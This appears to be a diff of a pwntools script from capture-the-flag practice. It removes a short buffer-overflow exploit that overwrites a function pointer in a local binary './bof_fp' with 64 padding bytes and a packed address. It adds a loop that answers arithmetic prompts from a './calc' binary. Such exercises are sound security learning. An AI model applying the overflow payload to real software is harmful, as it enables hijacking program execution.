@@ -1,6 +1,20 @@
 from pwn import *
-p = process('./bof_fp')
 
-print p.recv()
-p.send('A'*64+p32(0x804854b))
-p.interactive()
+s=process("./calc")
+
+for _ in range(100):
+    s.recvuntil(' >')
+    inp = s.recv(3)
+    (a,b)=map(int,s.recvline().split())
+    if inp=='mul':
+        snd=a*b
+    elif inp=="add":
+        snd=a+b
+    elif inp=="sub":
+        snd=a-b
+    elif inp=="div":
+        snd=a/b
+    s.sendline(str(snd))
+    sleep(0.01)
+
+s.interactive()
